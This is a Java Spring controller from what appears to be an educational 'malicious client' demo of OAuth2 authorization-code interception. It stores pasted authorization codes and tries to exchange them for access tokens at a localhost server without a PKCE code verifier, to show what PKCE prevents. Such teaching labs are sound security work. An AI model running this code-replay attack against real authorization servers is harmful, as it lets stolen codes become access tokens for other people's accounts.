package edu.sde.maliciousclient.controller;

import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.*;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.client.RestTemplate;

import java.time.LocalDateTime;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

@Controller
public class AttackController {

    private static final Logger log = LoggerFactory.getLogger(AttackController.class);
    
    // In-memory storage for intercepted codes (for demo purposes)
    private final Map<String, InterceptedCode> interceptedCodes = new ConcurrentHashMap<>();
    private final RestTemplate restTemplate = new RestTemplate();
    private final ObjectMapper objectMapper = new ObjectMapper();

    @Value("${malicious.auth-server-base-url:http://localhost:9000}")
    private String authServerBaseUrl;

    @Value("${malicious.auth-server-token-endpoint:http://localhost:9000/oauth2/token}")
    private String tokenEndpoint;

    @Value("${malicious.auth-server-authorize-endpoint:http://localhost:9000/oauth2/authorize}")
    private String authorizeEndpoint;

    @Value("${malicious.client-id:test-app}")
    private String clientId;

    @Value("${malicious.client-secret:test-secret}")
    private String clientSecret;

    @Value("${malicious.redirect-uri:http://localhost:8082/auth/callback}")
    private String redirectUri;

    @GetMapping("/")
    public String home(Model model) {
        model.addAttribute("interceptedCodesCount", interceptedCodes.size());
        model.addAttribute("recentCodes", getRecentCodes(5));
        return "index";
    }

    @GetMapping("/intercept")
    public String interceptPage(Model model) {
        model.addAttribute("clientId", clientId);
        model.addAttribute("redirectUri", redirectUri);
        return "intercept";
    }

    @PostMapping("/intercept")
    public String interceptCode(@RequestParam("authorizationCode") String authorizationCode,
                               Model model) {
        try {
            // Store the intercepted code
            String codeId = UUID.randomUUID().toString();
            InterceptedCode interceptedCode = new InterceptedCode(
                codeId, authorizationCode, LocalDateTime.now()
            );
            interceptedCodes.put(codeId, interceptedCode);
            
            log.warn("🚨 MALICIOUS: Intercepted authorization code: {}", authorizationCode);
            
            model.addAttribute("codeId", codeId);
            model.addAttribute("authorizationCode", authorizationCode);
            model.addAttribute("success", true);
            model.addAttribute("message", "Authorization code intercepted successfully!");
            
        } catch (Exception e) {
            model.addAttribute("success", false);
            model.addAttribute("message", "Failed to intercept code: " + e.getMessage());
        }
        
        return "intercept-result";
    }

    @GetMapping("/attack")
    public String attackPage(Model model) {
        model.addAttribute("interceptedCodes", new ArrayList<>(interceptedCodes.values()));
        return "attack";
    }

    @PostMapping("/attack")
    public String executeAttack(@RequestParam("codeId") String codeId,
                               Model model) {
        try {
            InterceptedCode interceptedCode = interceptedCodes.get(codeId);
            if (interceptedCode == null) {
                model.addAttribute("success", false);
                model.addAttribute("message", "Authorization code not found or expired");
                return "attack-result";
            }

            // Try to exchange the intercepted code for tokens WITHOUT PKCE
            Map<String, Object> tokenResponse = attemptTokenExchange(
                interceptedCode.authorizationCode()
            );

            interceptedCode = interceptedCode.markAttackAttempted();
            interceptedCodes.put(codeId, interceptedCode);
            
            if (tokenResponse != null && tokenResponse.containsKey("access_token")) {
                interceptedCode = interceptedCode.markAttackSuccessful();
                interceptedCodes.put(codeId, interceptedCode);
                log.error("🚨 CRITICAL: Attack successful! Obtained access token using intercepted code");
                
                model.addAttribute("success", true);
                model.addAttribute("message", "🚨 ATTACK SUCCESSFUL! Obtained access token using intercepted authorization code");
                model.addAttribute("tokenResponse", tokenResponse);
                model.addAttribute("vulnerability", "This demonstrates the vulnerability that PKCE protects against!");
            } else {
                model.addAttribute("success", false);
                model.addAttribute("message", "Attack failed: " + tokenResponse);
                model.addAttribute("vulnerability", "PKCE protection is working! Code verifier is required.");
            }
            
            model.addAttribute("interceptedCode", interceptedCode);
            
        } catch (Exception e) {
            model.addAttribute("success", false);
            model.addAttribute("message", "Attack failed with exception: " + e.getMessage());
            model.addAttribute("vulnerability", "PKCE protection is working! " + e.getMessage());
        }
        
        return "attack-result";
    }

    @GetMapping("/analyze")
    public String analyzePage(Model model) {
        long totalCodes = interceptedCodes.size();
        long attemptedAttacks = interceptedCodes.values().stream()
                .filter(InterceptedCode::attackAttempted)
                .count();
        long successfulAttacks = interceptedCodes.values().stream()
                .filter(InterceptedCode::attackSuccessful)
                .count();
        
        model.addAttribute("totalCodes", totalCodes);
        model.addAttribute("attemptedAttacks", attemptedAttacks);
        model.addAttribute("successfulAttacks", successfulAttacks);
        model.addAttribute("successRate", totalCodes > 0 ? (successfulAttacks * 100.0 / attemptedAttacks) : 0);
        model.addAttribute("recentActivity", getRecentCodes(10));
        
        return "analyze";
    }

    @GetMapping("/clear")
    public String clearCodes() {
        interceptedCodes.clear();
        return "redirect:/";
    }

    private Map<String, Object> attemptTokenExchange(String authorizationCode) {
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        headers.setBasicAuth(clientId, clientSecret); // Using client credentials
        
        MultiValueMap<String, String> body = new LinkedMultiValueMap<>();
        body.add("grant_type", "authorization_code");
        body.add("code", authorizationCode);
        body.add("redirect_uri", redirectUri);
        // Notice: NO code_verifier is provided - this is what makes the attack possible
        
        HttpEntity<MultiValueMap<String, String>> request = new HttpEntity<>(body, headers);
        
        try {
            ResponseEntity<String> response = restTemplate.exchange(
                tokenEndpoint,
                HttpMethod.POST,
                request,
                String.class
            );
            
            if (response.getStatusCode() == HttpStatus.OK) {
                // Parse the response safely
                return objectMapper.readValue(response.getBody(), new TypeReference<Map<String, Object>>() {});
            } else {
                return Map.of("error", "HTTP " + response.getStatusCode(), 
                            "response_body", response.getBody());
            }
        } catch (Exception e) {
            return Map.of("error", e.getMessage());
        }
    }
    
    private List<InterceptedCode> getRecentCodes(int count) {
        return interceptedCodes.values().stream()
                .sorted((a, b) -> b.interceptedAt().compareTo(a.interceptedAt()))
                .limit(count)
                .toList();
    }
    
    // Record to store intercepted code information
    public record InterceptedCode(
        String id,
        String authorizationCode,
        LocalDateTime interceptedAt,
        boolean attackAttempted,
        boolean attackSuccessful,
        LocalDateTime lastAttackAttempt
    ) {
        public InterceptedCode(String id, String authorizationCode, LocalDateTime interceptedAt) {
            this(id, authorizationCode, interceptedAt, false, false, null);
        }
        
        public InterceptedCode markAttackAttempted() {
            return new InterceptedCode(id, authorizationCode, interceptedAt, true, attackSuccessful, LocalDateTime.now());
        }
        
        public InterceptedCode markAttackSuccessful() {
            return new InterceptedCode(id, authorizationCode, interceptedAt, true, true, LocalDateTime.now());
        }
    }
}